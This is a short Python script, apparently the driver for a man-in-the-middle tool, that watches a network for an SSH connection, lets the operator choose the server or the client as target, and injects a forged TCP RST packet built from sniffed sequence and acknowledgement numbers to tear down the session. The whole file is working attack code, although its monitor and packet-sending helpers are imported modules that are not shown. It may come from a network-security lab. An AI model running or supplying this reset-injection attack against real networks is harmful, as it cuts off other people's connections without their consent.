from hping import send_rst
from monitor import NetworkMonitor


def choose_target():
    print("\n========== TARGET ==========")
    print("1. Server")
    print("2. Client")

    while True:
        choice = input("Choose target: ").strip()
        if choice == "1":
            return "SERVER"
        if choice == "2":
            return "CLIENT"
        print("Invalid choice. Enter 1 or 2.")


def main():
    print("[*] Starting MITM TCP monitor...")

    monitor = NetworkMonitor()
    monitor.start()

    print("[*] Waiting for SSH connection...")
    monitor.wait_for_stability()
    print("\n[*] Connection is stable.")

    target = choose_target()

    try:
        state = monitor.get_state(target)
    except RuntimeError as e:
        print(f"[!] {e}")
        return

    print("\n[+] RST state to inject:")
    for k, v in state.items():
        print(f"    {k}: {v}")

    send_rst(
        state["source_ip"],
        state["source_port"],
        state["destination_ip"],
        state["destination_port"],
        state["seq"],
        state["ack"],
    )


if __name__ == "__main__":
    main()
